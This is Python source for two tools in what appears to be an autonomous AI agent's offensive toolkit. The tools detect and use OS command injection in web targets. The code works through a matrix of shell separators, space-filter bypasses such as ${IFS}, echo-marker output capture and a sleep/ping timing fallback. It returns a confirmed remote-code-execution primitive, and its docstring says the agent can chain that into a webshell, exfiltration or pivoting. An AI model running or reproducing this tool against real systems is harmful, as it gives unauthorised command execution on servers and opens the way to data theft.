"""TOOL: cmd_inject - OS command injection with output capture and timing fallback.

Separator matrix (; && | || newline / $() / backticks) x OS flavors, inline
echo-marker output extraction, and a time-based blind fallback. Reports the
exact working primitive so the agent can chain it (webshell, exfil, pivot).
"""
import json, time

from tools import register
from tools._exploit_lib import (marker, paced_send, apply_template,
                                calibrate, verdict, extract_between)

SEPARATORS = [";", "&&", "|", "||", "\n", "`", "$( ", "%0a"]
SPACE_BYPASS = ["${IFS}", "$IFS$9", "%09", "{cmd,arg}"]

def _echo(cmd, m1, m2, os_flavor="auto"):
    if os_flavor == "win":
        return f"echo {m1}& {cmd} & echo {m2}"
    if os_flavor == "unix":
        return f"echo {m1}; {cmd}; echo {m2}"
    return f"echo {m1}; {cmd} ; echo {m2}"

def _sleep(os_flavor):
    if os_flavor == "win":
        return "ping -n 6 127.0.0.1 >nul"
    if os_flavor == "unix":
        return "sleep 5"
    return "sleep 5"

@register(name="cmd_exec_probe",
          desc="STRIKE (cmd step 1): OS command injection — separator matrix + echo-marker output capture + time-based blind fallback. Returns the working primitive (url_template + separator) AND command output. For repeat commands on that primitive, prefer shell_exec; for many rounds, upload_webshell + shell_session.",
          params={"type": "object", "properties": {
              "url_template": {"type": "string", "description": "URL with {INJ} placeholder where the command goes"},
              "cmd": {"type": "string", "default": "id"},
              "os_flavor": {"type": "string", "enum": ["auto", "unix", "win"], "default": "auto"},
              "blind": {"type": "boolean", "default": False, "description": "skip output capture, timing oracle only"}},
              "required": ["url_template"]},
          danger="loud")
def cmd_exec_probe(url_template, cmd="id", os_flavor="auto", blind=False):
    if "{INJ}" not in url_template:
        return verdict("cmd_exec_probe", False, "url_template lacks {INJ} placeholder")
    base_st, base_body, base_dt = paced_send(apply_template(url_template, "benchmark"))
    m1, m2 = marker(), marker()
    evidence, working = [], None

    if not blind:
        for sep in SEPARATORS:
            variants = [sep + _echo(cmd, m1, m2, os_flavor)]
            if sep == "$( ":
                variants.append(f"$({_echo(cmd, m1, m2, os_flavor)})")
            if sep == "`":
                variants.append(f"`{_echo(cmd, m1, m2, os_flavor)}`")
            for pay in variants:
                st, body, dt = paced_send(apply_template(url_template, pay))
                out = extract_between(body or "", m1, m2)
                if out is not None:
                    working = {"separator": sep.strip() or "newline", "payload": pay[:120],
                               "status": st, "output": out[:900]}
                    break
            if working:
                break

    # second pass: space bypass (${IFS}, $IFS$9, %09) when first pass blocked
    if not working and not blind:
        for sb in SPACE_BYPASS:
            for sep in SEPARATORS:
                def _echo_sb(c, m1, m2):
                    return f"echo{sb}{m1};{sb}{c}{sb};{sb}echo{sb}{m2}"
                pay = sep + _echo_sb(cmd, m1, m2)
                st, body, dt = paced_send(apply_template(url_template, pay))
                out = extract_between(body or "", m1, m2)
                if out is not None:
                    working = {"separator": sep.strip() or "newline",
                               "space_bypass": sb,
                               "payload": pay[:120],
                               "status": st, "output": out[:900]}
                    break
            if working:
                break

    if not working:
        # time-based blind: calibrate then confirm with OS-appropriate sleep
        flavors = [os_flavor] if os_flavor != "auto" else ["unix", "win"]
        for fl in flavors:
            mean, _mn = calibrate(lambda: paced_send(apply_template(url_template, "x")), probes=2)
            st, body, dt = paced_send(apply_template(url_template, _tsep(fl, _sleep(fl))))
            if dt > max(mean + 3.0, 4.0):
                working = {"separator": "time-based", "os": fl,
                           "payload": _tsep(fl, _sleep(fl))[:120],
                           "baseline_dt": round(mean, 2), "delayed_dt": dt}
                break

    exploitable = bool(working)
    return verdict("cmd_exec_probe", exploitable,
                   (f"RCE CONFIRMED via '{working['separator']}' — output captured"
                    if working and "output" in working else
                    f"blind RCE confirmed via timing ({working['os']})" if working else
                    "no injection across separator matrix — target likely parameterized/escaped"),
                   evidence=[json.dumps(working)[:400]] if working else [],
                   primitive=working)


def _tsep(flavor, sleep_cmd):
    sep = "&" if flavor == "win" else ";"
    return f"{sep} {sleep_cmd}"

@register(name="shell_exec",
          desc="STRIKE (cmd step 2): run a command through a CONFIRMED cmd_exec_probe primitive (url_template + separator). Use when cmd_exec_probe already found the injection point; NOT for discovering one.",
          params={"type": "object", "properties": {
              "url_template": {"type": "string"},
              "separator": {"type": "string", "default": ";"},
              "cmd": {"type": "string"},
              "os_flavor": {"type": "string", "enum": ["auto", "unix", "win"], "default": "auto"}},
              "required": ["url_template", "cmd"]},
          danger="loud")
def shell_exec(url_template, separator=";", cmd="id", os_flavor="auto"):
    if "{INJ}" not in url_template:
        return verdict("shell_exec", False, "url_template lacks {INJ}")
    m1, m2 = marker(), marker()
    pay = separator + " " + _echo(cmd, m1, m2, os_flavor)
    st, body, dt = paced_send(apply_template(url_template, pay))
    out = extract_between(body or "", m1, m2)
    return verdict("shell_exec", out is not None,
                   (f"output captured ({len(out or '')}B, {dt}s)" if out is not None
                    else "no output between markers — primitive may be blind; try cmd_exec_probe blind mode"),
                   evidence=[(out or "")[:600]], output=out, status=st, duration_s=dt)
